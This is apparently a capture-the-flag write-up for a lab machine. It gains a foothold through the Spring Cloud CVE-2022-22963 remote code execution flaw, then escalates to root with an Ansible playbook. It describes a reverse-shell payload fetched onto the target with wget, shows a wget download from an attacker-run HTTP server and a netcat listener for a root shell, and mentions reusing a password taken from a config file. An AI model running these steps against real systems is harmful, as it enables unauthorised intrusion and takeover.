## Intial Foothold
**CVE-2022-22963: Spring Cloud RCE Vulnerability**

[All about Vulnerability](https://sysdig.com/blog/cve-2022-22963-spring-cloud/)

### Exploit

```
python3 exploit.py
```
**What does exploit.py do**
- Create a shell.sh file that contains a Python3 one-liner reverse shell.
- Create simple HTTP Server.
- Upload shell.sh to /tmp directory in the target machine using wget.
- Run netcat listener to catch the reverse shell connection.
- Run chmod +x evil.sh, run evil.sh and get reverse shell.
- Do not forget to change IP and Port in exploit.py.

---
## Privilege Escalation:
**SU to phil user using his password located in /home/frank/.m2/settings.xml and use Ansible playbook to ecalate to root**

[Ansible Playbook Exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)

### Exploit

- Upload PrivEsc.py to target using wget and python Simple HTTP Server.
  - Run Simple HTTP Server on Attacker Machine.
    
    ```
    python3 http.server 8000
    ```
  - Download PriEsc.py on Target Machine.
    
    ```
    wget http://<Local_IP>:8000/PrivEsc.py
    ```
- Run netcat listener on Attacker Machine

    ```
    nc -nlvp 4444
    ```
- Run PrivEsc.py and wait for Root shell connection it may take a while.

    ```
    python3 PrivEsc.py
    ```
